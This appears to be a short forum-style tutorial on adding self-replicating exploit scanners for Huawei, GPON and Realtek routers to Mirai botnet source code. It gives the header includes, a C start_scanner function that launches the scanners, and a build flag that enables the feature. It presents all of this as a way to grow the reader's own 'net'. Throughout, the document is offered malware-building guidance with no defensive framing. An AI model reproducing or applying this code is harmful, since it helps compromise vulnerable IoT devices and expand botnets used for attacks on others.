Welcome Back, Toady Im Showing You How To Add A Selfrep Into A Mirai Source, This Is One Of Multiple Ways To Do This.

First We Need To Include The Selfreps Headers By Adding

These Will Vary Depending On Your Selfreps.

#include "huawei_scanner.h"
#include "gpon80_scanner.h"
#include "gpon8080_scanner.h"
#include "realtek_scanner.h"

Next, We Are Going To Add A Piece Of Code To Make The Reps Work So To Say <3
Edit The "ints" To Match The Code You Need. These Can Be Found In The .h Of The Files.
Mine Is Setup For Gpon80, Gpon8080, Realtek And Huawei.

SelfRep Code:
#ifdef SELFREP
void start_scanner(void)
{
	int rand_num = 0, processors = sysconf(_SC_NPROCESSORS_ONLN);
	
	srand(time(NULL));
	rand_num = rand() % 100;
	
	if(processors > 1)
	{
		#ifdef DEBUG
			printf("[debug] device has 2 or more processors, running both scanners.");
		#endif
		huaweiscanner_scanner_init();
		realtek_scanner();
		gpon8080_scanner();
		gpon80_scanner();
		scanner_init();
	} else if(rand_num > 35)
	{
		gpon8080_scanner();
		gpon80_scanner();
	} else
	{
		huaweiscanner_scanner_init();
		realtek_scanner();
		scanner_init();
	}
}
#endif


Next We Edit The Build.sh By Adding " -DSELFREP" To The Compile Stage.

Thats Pretty Much It, Besides Editing The Reps To Run For Your Net, But Thats Self Explanitory.
